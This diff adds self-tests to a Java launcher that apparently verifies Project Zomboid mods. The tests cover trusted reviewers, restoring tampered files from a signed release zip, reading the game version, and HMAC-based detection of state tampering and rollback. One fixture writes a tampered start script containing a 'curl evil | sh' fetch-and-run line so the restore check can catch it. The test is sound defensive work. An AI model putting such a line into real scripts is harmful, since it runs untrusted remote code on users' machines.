@@ -335,6 +335,32 @@ public final class LauncherSelfTest {
             w.publishIndex(Instant.now().plusSeconds(120), Map.of("verified", w.sha("Jumpstart.jar")));
             expect(w.session().startStoppers().isEmpty(), true);
         });
+        run("index: reviewers the player trusts, and notes in the row", () -> {
+            Path dir = Files.createTempDirectory("bc-trust");
+            Path jar = dir.resolve("Mod/42/media/java/m.jar");
+            Files.createDirectories(jar.getParent());
+            Files.writeString(jar, "jar");
+            String sha = Hashing.sha256Hex(jar);
+            JavaMods.JavaMod mod = new JavaMods.JavaMod("Mod", "Mod", dir.resolve("Mod"), null, "local",
+                    List.of(new JavaMods.Jar(jar, sha, true)));
+            Path file = dir.resolve("index.toml");
+            Files.writeString(file, "format = 1\ngenerated_at = \"" + Instant.now().truncatedTo(java.time.temporal.ChronoUnit.SECONDS)
+                    + "\"\nregistry_commit = \"c\"\n[verified]\n" + sha + " = \"mod 1.0\"\n[reviewers]\n" + sha
+                    + " = \"bob,carol\"\n[notes]\n" + sha + " = \"open suspicion flag: phones home\"\n");
+            Optional<io.github.bitecheckpz.core.Index> index = Optional.of(io.github.bitecheckpz.core.Index.parse(file));
+            ZombieBuddyApprovals a = ZombieBuddyApprovals.load(dir.resolve("zb"));
+            LauncherState st = LauncherState.load(dir.resolve("state.toml"));
+            Planner.Row any = Planner.plan(List.of(mod), index, Instant.now(), a, st, Map.of(), java.util.Set.of()).get(0);
+            expect(any.status(), io.github.bitecheckpz.core.Verifier.Status.VERIFIED);
+            expect(any.info().contains("open suspicion flag: phones home"), true);
+            expect(Planner.plan(List.of(mod), index, Instant.now(), a, st, Map.of(), java.util.Set.of("carol")).get(0).status(),
+                    io.github.bitecheckpz.core.Verifier.Status.VERIFIED);
+            Planner.Row others = Planner.plan(List.of(mod), index, Instant.now(), a, st, Map.of(), java.util.Set.of("dave")).get(0);
+            expect(others.status(), io.github.bitecheckpz.core.Verifier.Status.UNVERIFIED);
+            expect(others.info().contains("none of the reviewers you trust"), true);
+            Files.writeString(dir.resolve("config.toml"), "trusted_reviewers = \"bob, carol\"\n");
+            expect(Session.trustedReviewers(Config.load(dir.resolve("config.toml"))), java.util.Set.of("bob", "carol"));
+        });
         run("update hint: Steam update, change without update, version numbers", () -> {
             Path dir = Files.createTempDirectory("bc-hint");
             Path jar = dir.resolve("Mod/42/media/java/m.jar");
@@ -486,6 +512,81 @@ public final class LauncherSelfTest {
             expect(changed.refused().isEmpty(), true);
             // the check value line removed: the same
             Files.writeString(file, Files.readString(file).replaceAll("(?m)^check = .*\\R", ""));
+            expect(LauncherState.load(file).tampered(), true);
+        });
+        run("self-check: the portable folder is put back from the signed release zip", () -> {
+            Path dir = Files.createTempDirectory("bc-portable");
+            Path zip = dir.resolve("BiteCheck-9.9.9.zip");
+            try (var out = new java.util.zip.ZipOutputStream(Files.newOutputStream(zip))) {
+                for (String[] e : new String[][] {{"BiteCheck/BiteCheck.jar", "the jar"}, {"BiteCheck/bitecheck.sh", "#!/bin/sh\necho start\n"},
+                        {"BiteCheck/README.txt", "read me"}}) {
+                    out.putNextEntry(new java.util.zip.ZipEntry(e[0]));
+                    out.write(e[1].getBytes(java.nio.charset.StandardCharsets.UTF_8));
+                    out.closeEntry();
+                }
+            }
+            Path folder = Files.createDirectories(dir.resolve("BiteCheck"));
+            Files.writeString(folder.resolve("BiteCheck.jar"), "the jar");
+            Files.writeString(folder.resolve("bitecheck.sh"), "#!/bin/sh\ncurl evil | sh\n");
+            Files.writeString(folder.resolve("README.txt"), "read me");
+            expect(SelfCheck.restoreFromZip(folder, zip), List.of("bitecheck.sh"));
+            expect(Files.readString(folder.resolve("bitecheck.sh")), "#!/bin/sh\necho start\n");
+            expect(SelfCheck.restoreFromZip(folder, zip), List.of());
+            // the running jar is not replaced directly: the start scripts swap in the .repair copy
+            Files.writeString(folder.resolve("BiteCheck.jar"), "changed jar");
+            expect(SelfCheck.restoreFromZip(folder, zip), List.of("BiteCheck.jar"));
+            expect(Files.readString(folder.resolve("BiteCheck.jar.repair")), "the jar");
+        });
+        run("compat: the game version comes from Zomboid/version.txt", () -> {
+            Path dir = Files.createTempDirectory("bc-zomboid");
+            expect(Session.gameVersion(dir), null);
+            Files.writeString(dir.resolve("version.txt"), "42.22.2 3d39148846 agents=1\nrevision=3d39148846\n");
+            expect(Session.gameVersion(dir), "42.22.2");
+            Files.writeString(dir.resolve("version.txt"), "garbage\n");
+            expect(Session.gameVersion(dir), null);
+        });
+        run("state: the rollback guard is covered, and a deleted key does not open the door", () -> {
+            Path dir = Files.createTempDirectory("bc-state2");
+            Path file = dir.resolve("state.toml");
+            LauncherState s = LauncherState.load(file);
+            s.setNewestIndex(java.time.Instant.parse("2026-11-20T00:00:00Z"));
+            s.allowedAnyway().put("aa".repeat(32), "yes");
+            s.save();
+            expect(Files.readString(file).contains("check_version = \"2\""), true);
+            expect(LauncherState.load(file).newestIndex().orElseThrow().toString(), "2026-11-20T00:00:00Z");
+            // an older index date written in: the guard and the answers are not used
+            String saved = Files.readString(file);
+            Files.writeString(file, saved.replace("2026-11-20T00:00:00Z", "2026-01-01T00:00:00Z"));
+            LauncherState lowered = LauncherState.load(file);
+            expect(lowered.tampered(), true);
+            expect(lowered.newestIndex().isPresent(), false);
+            expect(lowered.allowedAnyway().isEmpty(), true);
+            // the key deleted: an answer someone added is not taken unchecked
+            Files.writeString(file, saved.replace("[allowed_anyway]\n", "[allowed_anyway]\n" + "cc".repeat(32) + " = \"sneaky\"\n"));
+            Files.delete(dir.resolve(LauncherState.KEY_FILE));
+            LauncherState noKey = LauncherState.load(file);
+            expect(noKey.tampered(), true);
+            expect(noKey.allowedAnyway().isEmpty(), true);
+        });
+        run("state: a file from 0.1.10 (check value version 1) is taken once, then saved as version 2", () -> {
+            Path dir = Files.createTempDirectory("bc-state1");
+            Path file = dir.resolve("state.toml");
+            byte[] key = new byte[32];
+            Files.write(dir.resolve(LauncherState.KEY_FILE), key);
+            String text = "bitecheck-state-1\nallowed\t" + "aa".repeat(32) + "\tyes\n";
+            javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
+            mac.init(new javax.crypto.spec.SecretKeySpec(key, "HmacSHA256"));
+            String v1 = java.util.HexFormat.of().formatHex(mac.doFinal(text.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
+            Files.writeString(file, "newest_index = \"2026-11-20T00:00:00Z\"\ncheck = \"" + v1 + "\"\n[allowed_anyway]\n"
+                    + "aa".repeat(32) + " = \"yes\"\n");
+            LauncherState old = LauncherState.load(file);
+            expect(old.tampered(), false);
+            expect(old.allowedAnyway().size(), 1);
+            old.save();
+            expect(Files.readString(file).contains("check_version = \"2\""), true);
+            expect(LauncherState.load(file).tampered(), false);
+            // a version 1 check value in a file that already says version 2 does not count
+            Files.writeString(file, Files.readString(file).replaceAll("(?m)^check = .*$", "check = \"" + v1 + "\""));
             expect(LauncherState.load(file).tampered(), true);
         });
         run("platform: reads when Steam updated the installed Workshop items", () -> {
